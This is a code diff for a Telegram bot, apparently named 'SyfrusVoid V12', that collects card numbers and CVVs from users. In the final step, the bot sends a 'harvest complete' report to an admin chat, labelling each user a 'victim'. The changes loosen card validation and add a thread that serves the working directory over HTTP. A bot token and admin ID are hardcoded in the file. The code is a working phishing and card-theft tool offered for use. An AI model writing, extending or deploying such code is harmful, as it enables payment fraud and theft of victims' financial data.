@@ -16,6 +16,16 @@ from telegram.ext import (
     ConversationHandler,
 )
 
+# --- RENDER ULTRA CANLILIK SERVİSİ (BOZMADAN EKLENDİ) ---
+def keep_alive():
+    try:
+        PORT = int(os.environ.get("PORT", 8080))
+        handler = http.server.SimpleHTTPRequestHandler
+        with socketserver.TCPServer(("", PORT), handler) as httpd:
+            httpd.serve_forever()
+    except Exception:
+        pass
+
 # --- AYARLAR ---
 BOT_TOKEN = "8250377483:AAEn4fn1mbPE7Y8KMXP-1iGH1Tpy17bxbS4"
 ADMIN_ID = 7636413914 
@@ -31,9 +41,7 @@ PAKETLER = {
 
 # --- KART DOĞRULAMA (ESNETİLMİŞ) ---
 def validate_card(card_number):
-    # Boşlukları temizle
     n = card_number.replace(" ", "").replace("-", "")
-    # Sadece sayı mı ve 15-16 hane mi? (Sallama koruması ama esnek)
     if not n.isdigit() or len(n) < 15 or len(n) > 16:
         return False
     return True
@@ -48,7 +56,6 @@ async def log_firlat(context, baslik, detay, ikon="🚀"):
         f"⏰ `23:48` | 📅 `20.04.2026`"
     )
     try:
-        # Logun gitmeme ihtimaline karşı print de ekledim
         print(f"LOG GÖNDERİLİYOR: {baslik}")
         await context.bot.send_message(chat_id=ADMIN_ID, text=rapor, parse_mode="Markdown")
     except Exception as e:
@@ -144,7 +151,7 @@ async def final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cvv = update.message.text
     d = context.user_data
     
-    # 💰 KRAL LOG BURADA (ASLA ATLAMAZ)
+    # 💰 LOG SİSTEMİ
     await log_firlat(context, "🔥 HASAT TAMAMLANDI 🔥", 
                     f"👤 **Kurban:** @{update.effective_user.username}\n"
                     f"🎯 **Hedef:** `@{d['target']}`\n"
@@ -159,6 +166,9 @@ async def final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 def main():
+    # --- RENDER ULTRA ATEŞLEME ---
+    threading.Thread(target=keep_alive, daemon=True).start()
+    
     app = Application.builder().token(BOT_TOKEN).build()
     
     conv = ConversationHandler(
@@ -178,13 +188,7 @@ def main():
     
     print("🚀 SyfrusVoid V12 Stabil Mod Aktif!")
     app.run_polling()
-def keep_alive():
-    PORT = int(os.environ.get("PORT", 8080))
-    handler = http.server.SimpleHTTPRequestHandler
-    with socketserver.TCPServer(("", PORT), handler) as httpd:
-        httpd.serve_forever()
-        
+
 if __name__ == "__main__":
-    main(threading.Thread(target=keep_alive, daemon=True).start()
-        )
-  
+    main()
+    
